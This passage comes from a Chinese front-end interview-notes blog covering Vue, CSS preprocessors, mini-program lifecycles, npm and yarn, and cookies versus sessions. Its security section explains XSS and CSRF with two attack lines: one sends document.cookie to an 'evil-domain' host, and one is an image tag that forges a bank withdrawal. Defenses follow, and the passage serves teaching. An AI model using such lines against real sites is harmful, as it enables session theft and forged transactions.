id="（4）三元运算符"><a href="#（4）三元运算符" class="headerlink" title="（4）三元运算符"></a>（4）三元运算符</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>[isActive?<span class="token punctuation">'</span>active<span class="token punctuation">'</span>:<span class="token punctuation">'</span>disActive<span class="token punctuation">'</span>]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> data:{      isActive: false,  },渲染为：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>disActive<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre><h3 id="（5）computed"><a href="#（5）computed" class="headerlink" title="（5）computed"></a>（5）computed</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">:class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>classObject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  data:{    isActive: true,  },  computed: {      classObject: {          active: this.isActive,      }  }</code></pre><h2 id="v-model"><a href="#v-model" class="headerlink" title="v-model"></a>v-model</h2><p> v-model本质上是一个语法糖。（双向的）</p><p>如下代码<code>&lt;input v-model=&quot;test&quot;&gt;</code>本质上是&lt;<code>input :value=&quot;test&quot; @input=&quot;test = $event.target.value&quot;&gt;</code> </p><p><code>:value=&quot;test&quot;</code>设置input初始值为text值，</p><p><code>@input=&quot;test = $event.target.value</code>,当输入的值改变时，test更新</p><h2 id="Sass与Stylus的常见语法"><a href="#Sass与Stylus的常见语法" class="headerlink" title="Sass与Stylus的常见语法"></a>Sass与Stylus的常见语法</h2><p>Sass,Stylus都是css预处理器，除了这两种之外还有less等。</p><h3 id="Sass与Stylus的对比"><a href="#Sass与Stylus的对比" class="headerlink" title="Sass与Stylus的对比"></a>Sass与Stylus的对比</h3><p>参考于<a href="https://segmentfault.com/a/1190000008013566" target="_blank" rel="noopener">这篇文章</a></p><ol><li>变量</li></ol><p><code>sass</code>允许使用变量，所有的变量以<code>$</code>开头。</p><pre class=" language-css"><code class="language-css"><span class="token selector">$blue: <span class="token id">#1875e7</span>;div </span><span class="token punctuation">{</span>   <span class="token property">color</span><span class="token punctuation">:</span> $blue <span class="token punctuation">}</span></code></pre><p><code>stylus</code>也允许使用变量，变量名的<code>$</code>是可选的，变量值可以是表达式。</p><pre class=" language-css"><code class="language-css">color = blue 或者  $color = bluediv    <span class="token property">color</span><span class="token punctuation">:</span> color</code></pre><ol start="2"><li>计算属性</li></ol><p><code>sass</code>允许在代码中使用算式:</p><pre class=" language-css"><code class="language-css"><span class="token selector">body </span><span class="token punctuation">{</span>    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token number">14</span>px/<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">50</span>px + <span class="token number">100</span>px<span class="token punctuation">;</span>    <span class="token property">right</span><span class="token punctuation">:</span> $var * <span class="token number">10%</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p><code>stylus</code>同样也支持在代码中使用算式:</p><pre class=" language-css"><code class="language-css"> body    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token number">14</span>px/<span class="token number">2</span><span class="token punctuation">)</span>    <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">50</span>px + <span class="token number">100</span>px    <span class="token property">right</span><span class="token punctuation">:</span> var * <span class="token number">10%</span></code></pre><ol start="3"><li>嵌套</li></ol><p><code>sass</code>允许选择器嵌套。比如下面的<code>css</code>代码:</p><pre class=" language-css"><code class="language-css">  <span class="token selector">div h1 </span><span class="token punctuation">{</span>    <span class="token property">color</span><span class="token punctuation">:</span> red  <span class="token punctuation">}</span> <span class="token selector">可以写成：  div </span><span class="token punctuation">{</span>    <span class="token selector">h1</span><span class="token punctuation">{</span>      <span class="token property">color</span><span class="token punctuation">:</span> red   <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><p><code>stylus</code>同样支持选择器嵌套，上面的代码可以写成:</p><pre class=" language-css"><code class="language-css">div  h<span class="token number">1</span>    <span class="token property">color</span><span class="token punctuation">:</span> red</code></pre><p><code>sass</code>也支持属性嵌套,比如<code>border-color</code>属性可以写成:</p><pre class=" language-css"><code class="language-css"> <span class="token selector">p</span><span class="token punctuation">{</span>     <span class="token selector">border: </span><span class="token punctuation">{</span>       <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> border后面需要加上冒号</code></pre><p><strong>stylus没有这个功能</strong></p><ol start="4"><li>继承</li></ol><p><code>sass</code>允许一个选择器，继承另一个选择器。比如，现在<code>class1</code>：</p><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.class1</span> </span><span class="token punctuation">{</span>    <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#ddd</span>  <span class="token punctuation">}</span>  <span class="token selector">class2要继承class1，就要使用@extend命令。  <span class="token class">.class2</span> </span><span class="token punctuation">{</span>    @extend <span class="token number">.</span>class<span class="token number">1</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">120%</span>  <span class="token punctuation">}</span></code></pre><p><code>stylus</code>的继承方式和<code>sass</code>基本一致，但有一些稍微的不同。</p><p><code>stylus</code>实现继承:</p><pre class=" language-css"><code class="language-css"><span class="token number">.</span>class<span class="token number">1</span>    <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#ddd</span> <span class="token number">.</span>class<span class="token number">2</span>    @extend <span class="token number">.</span>class<span class="token number">1</span>    <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">120%</span></code></pre><p><strong>两者的区别主要在于–sass不允许@extend嵌套选择器:</strong><br>如下面的样式:</p><pre class=" language-css"><code class="language-css">div  h<span class="token number">1</span>   <span class="token property">color</span><span class="token punctuation">:</span> red</code></pre><p>在<code>sass</code>中，如果按照下面这样写就会直接编译错误。</p><pre class=" language-css"><code class="language-css"> <span class="token selector"><span class="token class">.div2</span> </span><span class="token punctuation">{</span>    @extend div h<span class="token number">1</span> <span class="token punctuation">}</span></code></pre><p>而在<code>stylus</code>中却可以成功编译，因为<code>stylus</code>中，只要选择器匹配，继承就会生效。</p><pre class=" language-css"><code class="language-css"><span class="token number">.</span>div<span class="token number">2</span>   @extend div h<span class="token number">1</span></code></pre><h2 id="小程序的页面栈与生命周期"><a href="#小程序的页面栈与生命周期" class="headerlink" title="小程序的页面栈与生命周期"></a>小程序的页面栈与生命周期</h2><h3 id="小程序的页面栈"><a href="#小程序的页面栈" class="headerlink" title="小程序的页面栈"></a>小程序的页面栈</h3><table><thead><tr><th>路由方式</th><th>页面栈</th></tr></thead><tbody><tr><td>初始化</td><td>新页面入栈</td></tr><tr><td>打开新页面（wx.navigateTo）</td><td>新页面入栈</td></tr><tr><td>页面重定向（wx.redirctTo）</td><td>当前页面出栈，新页面入栈</td></tr><tr><td>页面返回（wx.navigateBack）</td><td>页面不断出栈，直到目标返回页，新页面入栈</td></tr><tr><td>Tab切换（wx.switchTab或底部tab切换）</td><td>页面全部出栈，只留下新的Tab页面</td></tr><tr><td>重启动（wx.relaunch）</td><td>页面全部出栈，只留下新的页面</td></tr></tbody></table><ul><li><code>navigateTo</code>, <code>redirectTo</code> 只能打开非 tabBar 页面。</li><li><code>switchTab</code> 只能打开 tabBar 页面。</li><li><code>reLaunch</code> 可以打开任意页面。</li><li>页面底部的 tabBar 由页面决定，即只要是定义为 tabBar 的页面，底部都有 tabBar。</li><li>调用页面路由带的参数可以在目标页面的<code>onLoad</code>中获取。</li></ul><h3 id="小程序的生命周期"><a href="#小程序的生命周期" class="headerlink" title="小程序的生命周期"></a>小程序的生命周期</h3><pre class=" language-js"><code class="language-js"><span class="token function">onLaunch</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onLaunch监听小程序初始化'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">onShow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onShow监听小程序显示'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">onHide</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onLaunch监听小程序隐藏'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="页面的生命周期"><a href="#页面的生命周期" class="headerlink" title="页面的生命周期"></a>页面的生命周期</h3><pre class=" language-js"><code class="language-js"><span class="token function">onLoad</span><span class="token punctuation">(</span>options<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onLoad监听页面加载'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">onReady</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onReady监听页面初次渲染完成'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">onShow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onShow监听页面显示'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">onHide</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onHide监听页面隐藏'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">onUnload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'onUnload监听页面卸载'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="看代码说输出"><a href="#看代码说输出" class="headerlink" title="看代码说输出"></a>看代码说输出</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//词法作用域，找foo函数外面定义的length，即window.length</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> length <span class="token operator">=</span> <span class="token string">'jin'</span>    <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//输出的为window.length即为iframe的个数</span></code></pre><h2 id="package-json和package-lock-json"><a href="#package-json和package-lock-json" class="headerlink" title="package.json和package-lock.json"></a>package.json和package-lock.json</h2><p>npm描述模块信息的文件就是 package.json ，npm  install会根据package.json安装依赖</p><p>每次执行完npm install之后会对应生成package-lock文件，该文件记录了上一次安装的具体的版本号。</p><blockquote><p>原来的 package.json 文件只能锁定大版本，也就是版本号的第一位，并不能锁定后面的小版本，你每次npm install都是拉取的该大版本下的最新的版本，为了稳定性考虑我们几乎是不敢随意升级依赖包的，这将导致多出来很多工作量，测试/适配等，所以package-lock.json文件出来了，当你每次安装一个依赖的时候就锁定在你安装的这个版本。</p></blockquote><p>当文件中存在package-lock.json时，执行npm install，node从package.json文件读取模块名称，从package-lock.json文件中获取版本号，然后进行下载或者更新。 </p><h2 id="npm-nrm-yarn"><a href="#npm-nrm-yarn" class="headerlink" title="npm nrm yarn"></a>npm nrm yarn</h2><ul><li><a href="https://juejin.cn/post/6844904004279861262" target="_blank" rel="noopener">npm,nrm,yarn的关系</a></li></ul><blockquote><p>yarn 是 FaceBook 开源的一个新的包管理器， 和npm的作用是一样的，但是解决了一些npm的痛点。</p></blockquote><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><table><thead><tr><th>npm</th><th>yarn</th></tr></thead><tbody><tr><td>npm init</td><td>yarn init</td></tr><tr><td>npm install</td><td>yarn install</td></tr><tr><td>npm install –no-package-lock</td><td>yarn install –no-package-lock</td></tr><tr><td>npm install xxx –save</td><td>yarn add xxx</td></tr><tr><td>npm install xxx –save-dev</td><td>yarn add xxx –dev</td></tr><tr><td>npm uninstall xxx –save</td><td>yarn remove xxx</td></tr><tr><td>yarn add xx@version</td><td>npm install xx@vision</td></tr><tr><td>yarn upgrade xx</td><td>npm update xx</td></tr><tr><td>yarn upgrade xx@version</td><td>npm update xx@vision</td></tr><tr><td>yarn why xx</td><td>-</td></tr><tr><td>yarn config list</td><td>npm config list</td></tr></tbody></table><h3 id="npm中的-–save与–save-dev"><a href="#npm中的-–save与–save-dev" class="headerlink" title="npm中的 –save与–save-dev"></a>npm中的 –save与–save-dev</h3><ul><li><strong>i</strong> 是 <strong>install</strong> 的简写</li><li><strong>-g</strong> 是全局安装，不带 <strong>-g</strong> 会安装在个人文件夹</li><li><strong>-S</strong> 与 <strong>–save</strong> 的简写，安装包信息会写入 <strong>dependencies</strong> 中</li><li><p><strong>-D</strong> 与 <strong>–save-dev</strong> 的简写，安装包写入 <strong>devDependencies</strong> 中</p></li><li><p><strong>dependencies</strong> 生产阶段的依赖,也就是项目运行时的依赖</p></li><li><strong>devDependencies</strong> 开发阶段的依赖，就是我们在开发过程中需要的依赖，只在开发阶段起作用的</li></ul><hr><p>比如写 <code>ES6</code> 代码，需要 <code>babel</code> 转换成 <code>es5</code> ，转换完成后，我们只需要转换后的代码，上线的时候，直接把转换后的代码部署到生产环境，不需要 <code>bebal</code> 了，生产环境不需要。这就可以安装到 <strong>devDependencies</strong> ，再比如说代码提示工具，也可以安装到 <strong>devDependencies</strong> 。</p><p>如果你用了 <code>Element-UI</code>，由于发布到生产后还是依赖 <code>Element-UI</code>，这就可以安装到 <strong>dependencies</strong> 。</p><h2 id="什么是node-sass"><a href="#什么是node-sass" class="headerlink" title="什么是node-sass"></a>什么是node-sass</h2><blockquote><p>Node-sass是一个库，它将Node.<a href="http://www.fly63.com/tag/js" target="_blank" rel="noopener">js</a>绑定到LibSass（流行样式表预处理器Sass的C版本）。它允许用户以令人难以置信的速度将.s<a href="http://www.fly63.com/tag/css" target="_blank" rel="noopener">css</a>文件本地编译为<a href="http://www.fly63.com/tag/css" target="_blank" rel="noopener">css</a>，并通过连接中间件自动编译。</p></blockquote><h2 id="封装小程序分享参数"><a href="#封装小程序分享参数" class="headerlink" title="封装小程序分享参数"></a>封装小程序分享参数</h2><h3 id="onShareAppMessage-Object-object"><a href="#onShareAppMessage-Object-object" class="headerlink" title="onShareAppMessage(Object object)"></a>onShareAppMessage(Object object)</h3><p>监听用户点击页面内转发按钮（<a href="https://developers.weixin.qq.com/miniprogram/dev/component/button.html" target="_blank" rel="noopener">button</a> 组件 <code>open-type=&quot;share&quot;</code>）或右上角菜单“转发”按钮的行为，并自定义转发内容。 </p><table><thead><tr><th>参数</th><th>类型</th><th>说明</th><th>最低版本</th></tr></thead><tbody><tr><td>from</td><td>String</td><td>转发事件来源。 <code>button</code>：页面内转发按钮； <code>menu</code>：右上角转发菜单</td><td><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank" rel="noopener">1.2.4</a></td></tr><tr><td>target</td><td>Object</td><td>如果 <code>from</code> 值是 <code>button</code>，则 <code>target</code> 是触发这次转发事件的 <code>button</code>，否则为 <code>undefined</code></td><td><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank" rel="noopener">1.2.4</a></td></tr></tbody></table><p>target为button时，有以下参数</p><pre class=" language-js"><code class="language-js">dataset<span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>id<span class="token punctuation">:</span><span class="token string">""</span>offsetLeft<span class="token punctuation">:</span>offsetTop<span class="token punctuation">:</span></code></pre><p>此事件处理函数需要 return 一个 Object，用于自定义转发内容，返回内容如下：</p><p><strong>自定义转发内容</strong> 基础库 <a href="https://developers.weixin.qq.com/miniprogram/dev/framework/compatibility.html" target="_blank" rel="noopener">2.8.1</a> 起，分享图支持云图片。</p><table><thead><tr><th>字段</th><th>说明</th><th>默认值</th><th>最低版本</th></tr></thead><tbody><tr><td>title</td><td>转发标题</td><td>当前小程序名称</td><td></td></tr><tr><td>path</td><td>转发路径</td><td>当前页面 path ，必须是以 / 开头的完整路径</td><td></td></tr><tr><td>imageUrl</td><td>自定义图片路径，可以是本地文件路径、代码包文件路径或者网络图片路径。支持PNG及JPG。显示图片长宽比是 5:4。</td><td>使用默认截图</td><td>1.5.0</td></tr></tbody></table><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//封装好的函数</span><span class="token function">onShareAppMessage</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">.</span><span class="token keyword">from</span> <span class="token operator">===</span> <span class="token string">'button'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">let</span> data <span class="token operator">=</span> res<span class="token punctuation">.</span>target<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>data        <span class="token keyword">let</span> params <span class="token operator">=</span> <span class="token string">'?fromShare=1&amp;'</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                params <span class="token operator">+</span><span class="token operator">=</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>data<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&amp;`</span></span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        params <span class="token operator">=</span> params<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> params<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`【分享参数】：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>res<span class="token punctuation">.</span>target<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>params<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span>            title<span class="token punctuation">:</span> res<span class="token punctuation">.</span>target<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>title <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">,</span>            path<span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>res<span class="token punctuation">.</span>target<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>params<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span> <span class="token operator">||</span> <span class="token string">''</span><span class="token punctuation">,</span>            imageUrl<span class="token punctuation">:</span> res<span class="token punctuation">.</span>target<span class="token punctuation">.</span>dataset<span class="token punctuation">.</span>url <span class="token operator">||</span> <span class="token string">''</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="打开小程序分享链接时触发函数顺序"><a href="#打开小程序分享链接时触发函数顺序" class="headerlink" title="打开小程序分享链接时触发函数顺序"></a>打开小程序分享链接时触发函数顺序</h3><ul><li>首先会触发<code>APP.vue中的onShow函数</code></li><li>然后会触发打开页面的<code>onLoad与onShow页面</code></li></ul><h2 id="url编码与解码"><a href="#url编码与解码" class="headerlink" title="url编码与解码"></a>url编码与解码</h2><p>网页URL只能使用英文、数字、还有一些特定的字符，若出现中文字符就必须经过编码解码，否则服务器无法识别</p><p>编码方法有三种：</p><table><thead><tr><th>方法</th><th>规则</th><th>特点</th></tr></thead><tbody><tr><td>escape（编码） unescape</td><td>除了ASCII字母、数字、标点符号”@ * _ + - . /“以外，对其他所有字符进行编码</td><td>不提倡</td></tr><tr><td>encodeURI（编码） decodeURI（解码）</td><td>除了常见的符号以外，对其他一些在网址中有特殊含义的符号”; / ? : @ &amp; = + $ , #”，也不进行编码</td><td>encodeURI()是Javascript中真正用来对URL编码的函数，它着眼于对整个URL进行编码</td></tr><tr><td>encodeURIComponent（编码）  decodeURIComponent解码）</td><td>在encodeURI()中不被编码的符号”; / ? : @ &amp; = + $ , #”，在encodeURIComponent()中统统会被编码</td><td>与encodeURI()的区别是，它用于对URL的组成部分进行个别编码，而不用于对整个URL进行编码</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题（六）</title>
      <link href="2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E5%85%AD%EF%BC%89/"/>
      <url>2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E5%85%AD%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>什么是脱离文档流，定位与浮动</li><li>值类型与引用类型，堆和栈</li><li>MVC与MVVM</li><li>cookie和session的区别</li><li>html5的标签</li><li>数组和链表的对比</li><li>怎么实现轮播图</li><li>口述一下什么是原型链</li><li>详细理解instanceof</li><li>数组扁平化带深度参数</li><li>for 循环的问题怎么解决</li></ul><h2 id="什么是脱离文档流，定位与浮动"><a href="#什么是脱离文档流，定位与浮动" class="headerlink" title="什么是脱离文档流，定位与浮动"></a>什么是脱离文档流，定位与浮动</h2><p>所谓的<strong>文档流</strong>，指的是元素排版布局过程中，元素会自动从左往右，从上往下的流式排列。</p><p><strong>脱离文档流</strong>，也就是将元素从普通的布局排版中拿走，其他盒子在定位的时候，会当做脱离文档流的元素不存在而进行定位。</p><p><strong>浮动 ( float ) 和绝对定位 ( position:absolute )</strong> </p><p>（1）均脱离文档流</p><p>（2）均不占位</p><p>（3）浮动情况下，其他元素会自动在其右边排列。绝对定位会完全忽视其存在。</p><ul><li><a href="https://www.jinjingxuan.com/2020/11/26/CSS-%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/" target="_blank" rel="noopener">盒子模型</a></li></ul><h2 id="值类型与引用类型，堆和栈"><a href="#值类型与引用类型，堆和栈" class="headerlink" title="值类型与引用类型，堆和栈"></a>值类型与引用类型，堆和栈</h2><ul><li>undefined null number string boolean symbol 属于值类型，object array function 属于引用类型 </li><li>值类型存储在栈中，引用类型存储在堆中。</li><li>值类型有固定的大小和值，存放在栈中，而引用类型不确定大小，但是其引用地址是固定的，因此，它的地址存在栈中，指向存在堆中的对象。 </li><li>值类型不可添加属性和方法，而引用类型可以添加属性和方法 </li><li>值类型比较只要相等，就可以用==或者===来比较，但是引用类型，即使let s = {};let s1 = {};但他们的内存地址不一样，比较依然不相等。</li><li><p>stack为自动分配的内存空间，它由系统自动释放；而heap则是动态分配的内存，大小不定也不会自动释放。  </p></li><li><p><a href="https://upload-images.jianshu.io/upload_images/2295405-2012a343e5e0c162.png?imageMogr2/auto-orient/strip|imageView2/2/w/423/format/webp" target="_blank" rel="noopener">图示</a></p></li></ul><h2 id="MVC与MVVM"><a href="#MVC与MVVM" class="headerlink" title="MVC与MVVM"></a>MVC与MVVM</h2><p>（1）MVC的定义：MVC是Model-View- Controller的简写。即模型-视图-控制器。 </p><ul><li>Model（模型）表示应用程序核心（如数据库）。</li><li>View（视图）显示效果（HTML页面）。</li><li>Controller（控制器）处理输入（业务逻辑）。 </li></ul><p>（2）MVVM是Model-View-ViewModel的简写。即模型-视图-视图模型。是MVC的升级版</p><ul><li>【模型】指的是后端传递的数据。</li><li>【视图】指的是所看到的页面。</li><li>【视图模型】mvvm模式的核心，它是连接view和model的桥梁。它有两个方向，也就是常说的双向绑定。 </li></ul><p>（3）在以前传统的开发模式当中即MVC模式，前端人员只负责MVC当中的View（视图）部分，写好页面交由后端创建渲染模板并提供数据，随着MVVM模式的出现前端已经可以自己写业务逻辑以及渲染模板，后端只负责数据即可，前端所能做的事情越来越多。</p><h2 id="cookie和session的区别"><a href="#cookie和session的区别" class="headerlink" title="cookie和session的区别"></a>cookie和session的区别</h2><blockquote><p>Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了 。</p></blockquote><ul><li><a href="https://juejin.cn/post/6844903575684907016" target="_blank" rel="noopener">Cookie 和 Session 关系和区别</a></li></ul><h3 id="Cookie和Session关系"><a href="#Cookie和Session关系" class="headerlink" title="Cookie和Session关系"></a>Cookie和Session关系</h3><ol><li>都是为了实现客户端与服务端交互而产出</li><li>Cookie是保存在客户端，缺点易伪造、不安全</li><li>Session是保存在服务端，会消耗服务器资源</li><li>Session实现有两种方式：Cookie和URL重写</li></ol><h3 id="Cookie带来的安全性问题"><a href="#Cookie带来的安全性问题" class="headerlink" title="Cookie带来的安全性问题"></a>Cookie带来的安全性问题</h3><ol><li><strong>会话劫持和XSS</strong>：在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。<code>(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</code>HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。</li><li><p><strong>跨站请求伪造（CSRF）</strong>：维基百科已经给了一个比较好的CSRF例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：<code>&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</code>当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。<strong>解决CSRF的办法有：隐藏域验证码、确认机制、较短的Cookie生命周期等</strong></p><h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h3></li></ol><p><strong>（1）验证 HTTP Referer 字段</strong> </p><p> 根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。 </p><p>如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值 。</p><p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的 ，目前已经有一些方法可以篡改 Referer 值 。</p><p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。 </p><p><strong>（2）在请求地址中添加 token 并验证</strong> </p><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。 </p><p>这种方法要比检查 Referer 要安全一些，token 